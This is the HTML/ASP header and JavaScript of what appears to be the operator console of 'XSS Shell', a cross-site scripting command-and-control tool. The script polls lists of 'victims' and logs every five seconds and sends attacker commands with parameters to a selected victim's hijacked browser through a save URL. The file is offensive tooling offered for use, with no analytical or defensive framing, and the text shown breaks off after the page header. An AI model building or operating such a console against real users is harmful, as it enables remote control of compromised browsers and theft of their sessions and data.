<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title><%=Title%></title>
</head>
	<link rel="stylesheet" href="fm.css" type="text/css" media="screen" title="Normal" />

	<script language="javascript" src="js/shelladmin.js" type="text/javascript"></script>
	<script language="javascript" src="js/soultip.js" type="text/javascript"></script>

	<script type="text/javascript" src="js/prototype.lite.js"></script>
	<script type="text/javascript" src="js/moo.ajax.js"></script>

	<script src="js/ous/prototype.js" type="text/javascript"></script>
	<script src="js/ous/scriptaculous.js" type="text/javascript"></script>

	<script>
		
		var LOGUPDATE_FREQ = 1000*5;
		var VICTIM_FREQ = 1000*5;
		var VICTIM;
		
		function viclist(response){		
			VICTIM = response.substring(response.lastIndexOf("[")+1);
		}

		// Push new commands
		function sendCommand(cmd){	
			var attackID = generateID();
			var param = encodeURIComponent(document.getElementById("params").value);
			var url = SAVE_URL + "?c=" + cmd + "&p=" + param + "&v=" + VICTIM;

			getRequest( url, "debug('Message sent :' + " + CALLBACK_PARAM + " + ', AttackID:Rnd()')");
			debug(url + " - Message is sending...");

		}
		
		function updateLog(){
			new ajax(LOGS_URL + "&r=" + generateID(), {updateEscape: $("log"), onComplete: logChanged});
		}

		function updateVic(){
			new ajax(VICTIMS_URL + "&r=" + generateID(), {updateEscape: $("victimsUpdater"), onComplete: vicChanged}); 
		}

		var logCache="", vicCache="";
		function logChanged(request){
			if(request.responseText != logCache){
				//new Effect.Highlight(document.getElementById("log"), "#ffff99")
			}		

			logCache = request.responseText;
			window.setTimeout("updateLog()", LOGUPDATE_FREQ);
		}

		function vicChanged(request){
			if(request.responseText != vicCache){
				//new Effect.Highlight(document.getElementById("victimsUpdater"), "#ffff99")
				viclist(request.responseText);
			}

			vicCache = request.responseText;
			window.setTimeout("updateVic()", VICTIM_FREQ);
		}

		function toggle(id){
			new Effect.SlideDown(document.getElementById(id));
		}

		function hi(div){
			div.className = "commandh";
		}

		function lo(div){
			div.className = "commandl";		
		}

		window.onLoad=init();

		function init(){
			updateLog();
			updateVic();
		}
	</script>

<body>
<div id="header"><img src="mg/lg.gif" width="28" height="148" border="0" alt="XSS Shell" /></div>
